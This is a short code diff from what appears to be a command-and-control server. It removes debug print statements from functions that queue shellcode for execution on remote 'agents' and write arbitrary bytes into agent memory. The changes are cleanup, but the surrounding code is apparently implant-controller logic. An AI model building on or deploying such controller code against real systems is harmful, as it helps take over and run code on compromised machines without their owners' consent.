@@ -13,7 +13,6 @@ def send_and_wait(agent_id, shellcode):
     shellcode = bytearray(shell_len + shellcode) # Shellcode size
     shellcode.insert(0, 0x01) # Exec
     agent_requests[agent_id] = shellcode
-    print(agent_requests)
     attempts = ATTEMPTS
     while True:
         attempts = attempts -1
@@ -51,12 +50,10 @@ def write_to_agent(agent_id, memory, data):
     from routes.anon.agent import handle_msg_type, requests as agent_requests
     from routes.anon.agent import ATTEMPTS
     global responses
-    print(f"Writing to agent {agent_id}, {hex(memory)}, {data}")
     memory_bytes = bytearray(memory.to_bytes(8, byteorder="little"))
     length_bytes = bytearray(len(data).to_bytes(8, byteorder="little"))
     data_blob = memory_bytes + length_bytes + data
     data_blob.insert(0, 0x3) # Write
-    print(f"Contents of data_blob = {data_blob}")
     agent_requests[agent_id] = data_blob
     attempts = ATTEMPTS
     while True:
@@ -68,6 +65,5 @@ def write_to_agent(agent_id, memory, data):
     return response_data
 
 def write_scratchpad(agent_id, data):
-    print(f"Writing to scratchpad for agent {agent_id}")
     agent_obj = Agent.by_id(agent_id)
     return write_to_agent(agent_id, agent_obj.scratchpad, data)
